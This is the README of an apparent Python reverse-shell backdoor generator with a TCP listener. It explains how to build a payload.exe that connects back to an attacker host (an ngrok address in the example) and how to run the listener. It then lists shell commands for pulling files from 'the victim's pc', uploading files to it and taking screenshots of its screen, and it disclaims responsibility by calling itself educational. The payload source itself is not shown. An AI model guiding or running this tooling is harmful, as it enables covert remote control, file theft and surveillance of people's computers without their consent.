
# Description
A python reverse shell backdoor generator alongside a TCP listener.

# Background
This a python backdoor generator. A backdoor is a script that gives you access to the victim's computer when the victim opens the backdoor/payload. When the user opens the exe,
a TCP connection is made to the listener pc (the attacker pc in this case). Thie listener pc will listen to incoming connections using a script found in this repository. This is
done only for educational purposes, and I take no responsibility or liability for own personal use.

# Guide
## 1. Run `setup.py`
This script prepares a standalone virtual enviroment for our generator to work with and installs the required dependencies and libraries from the `requirements.txt` file.
> Note:
>
> This script uses the subprocess library which will give it access to your shell/terminal to execute the needed commands.
>
> If you do not trust the script, make sure to check the code first and if still not satisfied, create a new virtual enviroment and download the needed libraries from `requirements.txt`

Navigate to the `config/` folder in the home directory of the repository and open your terminal so u could run `setup.py`

**Usage:**

```
$ python setup.py
```

If this script was executed successfully you should see a `venv` folder in the repository's home directory.

## 2. Use `generate.py`
This is the script used for generating reverse shell backdoors. All you have to do is specify the `LHOST` which is the **ip address or location** that you want the
reverse shell backdoor to connect to and the `LPORT` which is the **port** that you want the reverse shell backdoor to connect to.

**Usage:** 
```
$ python generate.py LHOST LPORT
```

**Real Example:**
```
$ python generate.py 2.tcp.ngrok.io 10827
```

1. **LHOST:** `2.tcp.ngrok.io`
2. **LPORT:** `10827`

After this command finishes execution. You should see:
1. An **executable of the generated reverse shell backdoor** `payload.exe` located in `output/executable`
2. The **source code of the generated reverse shell backdoor** `payload.py` located in `ouput/source`

## 3. Run `listen.py`
This is called a **listener**. This script is used to listen to incoming TCP connections from other devices. All you have to do is specify the `LHOST` which is
the **ip address or location** that you want to listen on and the `LPORT` which is the **port** that you want to listen on.

**Usage:** 
```
$ python listen.py LHOST LPORT
```

**Real Example:** 
```
$ python listen.py 0.0.0.0 5050
```

1. **LHOST:** `0.0.0.0`
2. **LPORT:** `5050`

> Note:
>
> It is **recommended** to use `0.0.0.0` or `127.0.0.1` as the listener's LHOST as it means listen on **the current host pc**.

After you run this script `listen.py, you should see a message `Listening on LHOST LPORT`. When the reverse shell backdoor that we generated gets opened, it will establish
a new connection to our host pc, which is already waiting and listening for new connections, and such a message should appear :

```
Established new connection: [ADDRESS] 192.168.1.6 [PORT] 5050
reverse_shell >>
```

This means that everything is working properly, and now you can control the victim's pc by typing in any cmd command.

## 4. Using The Reverse Shell

All the commands you normally use in your command prompt are available in the reverse shell, but there are some extra useful commands added to the reverse shell !

### 1. download
This command downloads any file from the directory (the victim's pc) you're currently in in the reverse shell to the directory in which `listen.py` is running.

**Usage:** 

```
reverse shell >> download image.png
```

### 2. upload
This command uploads any file from the directory in which `listen.py` is running to the directory (the victim's pc) you're currently in in the reverse shell.

**Usage:** 

```
reverse shell >> upload file.txt
```

### 3. snapshot
This command takes a screenshot of the current screen of the victim's pc and saves it to the directory (the victim's pc) you're currently in in the reverse shell.

**Usage:** 
```
reverse shell >> snapshot
```

# Extras
This was just for fun and educational purposes and I take no responsibility or liability for own personal use. Hope you like it.
